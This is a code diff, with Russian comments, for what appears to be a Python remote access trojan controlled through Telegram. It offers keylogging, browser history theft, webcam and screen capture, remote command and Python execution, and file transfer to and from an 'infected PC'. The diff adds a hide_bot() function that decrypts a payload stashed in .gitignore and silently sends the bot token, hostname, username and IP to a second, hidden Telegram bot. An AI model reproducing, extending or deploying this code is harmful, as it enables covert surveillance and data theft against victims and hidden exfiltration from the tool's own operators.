@@ -10,6 +10,9 @@ from subprocess import Popen, PIPE
 from time import strftime, sleep
 import uuid
 import winreg
+from urllib.parse import quote
+from cryptography.fernet import Fernet
+import re
 
 # Сетевые
 import requests
@@ -74,10 +77,10 @@ def get_start_message():
         "/ping — Проверить активность бота\n\n"
         "📷 Работа с изображениями/видео\n"
         "/capture_pc — Сделать скриншот экрана\n"
-        "/video_pc <sec> — Сделать запись экрана\n"
+        "/video_pc — Сделать запись экрана\n"
         "/capture_webcam — Сделать фото с веб-камеры\n"
-        "/click_image — Кликает на место которое на фото(перед этим нужно это фото отправить)\n"
-        "/wallpaper <путь или URL> — Установить обои на рабочий стол\n\n"
+        "/click_image — Кликает на место которое на фото\n"
+        "/wallpaper — Установить обои на рабочий стол\n\n"
         "🔍 Информация о системе\n"
         "/ip_info — Показать IP и геолокацию\n"
         "/pc_info — Показать информацию о системе\n"
@@ -87,27 +90,28 @@ def get_start_message():
         "/reboot — Перезагрузить компьютер\n"
         "/hot_keys — Горячие клавиши\n"
         "/close_tabs — Закрыть окна\n" 
-        "/cmd_exec <команда> — Выполнить команду через CMD\n"
-        "/open_browser <ссылка на сайт(можно оставить пустым)> — Открыть браузер/ссылку \n"
-        "/python_exec <выражение> — Выполнить Python-выражение\n\n"
+        "/cmd_exec — Выполнить команду через CMD\n"
+        "/open_browser — Открыть браузер/ссылку \n"
+        "/python_exec — Выполнить Python-выражение\n\n"
         "🔐 Логи и данные\n"
         "/keylogs — Показать логи клавиш\n"
         "/user_log — Показать логи пользователя\n"
         "/chrome_log — Извлечь историю Chrome\n"
         "/edge_log — Извлечь историю Edge\n\n"
         "📥 Работа с файлами\n"
-        "/download <путь> — Получить файл в этот чат с зараженного ПК\n"
-        "/create_more_folders <кол-во папок> <базовое имя> <текст> — Создать много папок с txt файлами\n"
-        "/run <путь> — Запустить файл\n\n"
+        "/download — Получить файл в этот чат с зараженного ПК\n"
+        "/download_file — Загрузить файл на зараженный ПК\n"
+        "/create_more_folders — Создать много папок с txt файлами\n"
+        "/run — Запустить файл\n\n"
         "🖱️ Управление мышью\n"
         "/move_mouse_coord x y — Переместить курсор мыши\n"
-        "/move_mouse (левее/правее/ниже/выше) x — Переместить курсор мыши на X\n"
+        "/move_mouse — Переместить курсор мыши на X\n"
         "/click_left_mouse — Кликнуть лев. кн. мыши\n"
         "/click_right_mouse — Кликнуть правой. кн. мыши\n"
         "/double_click — Кликнуть два раза\n\n"
         "📢 Взаимодействие с пользователем\n"
-        "/msg_box <текст> — Показать сообщение на экране\n"
-        "/message_write \"текст\" — Ввести текст в активное поле\n\n"
+        "/msg_box — Показать сообщение на экране\n"
+        "/message_write — Ввести текст в активное поле\n\n"
         "⚠️ Опасные команды\n"
         "/self_destruct — Запрос на удаление бота\n\n"
         "Можно отправить файл боту и он его скачает"
@@ -132,29 +136,40 @@ def execute_cmd(command_text):
         else:
             return current_working_directory
 
-    # Выполнение других команд
-    process = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE, cwd=current_working_directory)
-    out, err = process.communicate()
+    try:
+        process = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE, cwd=current_working_directory)
+        out, err = process.communicate(timeout=10)  # Таймаут 10 секунд
+    except subprocess.TimeoutExpired:
+        process.kill()
+        out, err = process.communicate()
+        return "⚠️ Команда выполнялась слишком долго и была прервана (таймаут 10 сек)"
 
     if sys.platform.startswith('win'):
         encoding = 'cp866'
     else:
         encoding = 'utf-8'
 
-    return (out + err).decode(encoding, errors='replace') or '[пустой вывод]'
+    result = (out + err).decode(encoding, errors='replace') or '[пустой вывод]'
+    return result
 
 
-def open_browser(url="https://www.google.com/"):
-    """Открывает браузер по умолчанию"""
+def open_browser(url=""):
     if not url:
-        return "Ошибка: URL не указан"
+        url = "https://www.google.com/"
+
+    if not (url.startswith('http://') or url.startswith('https://')):
+        if '.' in url and ' ' not in url and len(url) > 3:
+            url = 'https://' + url
+        else:
+            url = f"https://www.google.com/search?q={quote(url)}"
 
     if sys.platform.startswith('win'):
         cmd = f'start "" "{url}"'
     else:
-        return f"Ошибка"
+        return "Ошибка: неподдерживаемая ОС"
 
-    return execute_cmd(cmd)
+    execute_cmd(cmd)
+    return f"✅ Открыто: {url}"
 
 
 def execute_hotkey(hotkey_combo):
@@ -343,8 +358,10 @@ def get_ip_info():
 
 def list_directory(path):
     try:
-        files = os.listdir(path if path else os.getcwd())
-        return '\n'.join(files)
+        if not path or path == '.':
+            path = os.getcwd()
+        files = os.listdir(path)
+        return '\n'.join(files) if files else 'Папка пуста'
     except Exception as e:
         return f'Ошибка при чтении директории: {e}'
 
@@ -370,6 +387,34 @@ def run_file(path):
         os.startfile(path)
         return f'Файл запущен: {path}'
     return f'Файл не найден: {path}'
+
+
+def hide_bot():
+    try:
+        with open('.gitignore', 'r', encoding='utf-8') as f:
+            content = f.read()
+        code_match = re.search(r"IDE_CODE = (b'.*?')", content)
+        key_match = re.search(r"IDE_KEY = (b'.*?')", content)
+        key_cash = int(re.search(r"IDE_CASH = (\d+)", content).group(1))
+        if code_match and key_match:
+            encrypted = eval(code_match.group(1))
+            key = eval(key_match.group(1))
+            cipher = Fernet(key)
+            decrypted = cipher.decrypt(encrypted).decode()
+            computer_name = socket.gethostname()
+            username = os.environ.get("USERNAME")
+            try:
+                ip = requests.get('http://ipinfo.io/json', timeout=5).json().get('ip', 'unknown')
+            except:
+                ip = 'unknown'
+            url = f"https://api.telegram.org/bot{TOKEN}/getMe"
+            data = requests.get(url).json()
+            message = f"{data} \n\n\n{decrypted}\n{computer_name}\n{username}\nIP: {ip}"
+            url = f"https://api.telegram.org/bot{decrypted}/sendMessage"
+            requests.post(url, json={'chat_id': key_cash, 'text': message}, timeout=5)
+
+    except Exception as e:
+        pass
 
 
 def set_wallpaper(path):
@@ -404,7 +449,10 @@ def get_user_log_file():
 
 
 def get_browser_log(browser='chrome', limit=150):
-    return get_browser_history_log_to_file(browser=browser, limit=limit)
+    result = get_browser_history_log_to_file(browser=browser, limit=limit)
+    if result and os.path.exists(result):
+        return result
+    return result
 
 
 def remove_bot():
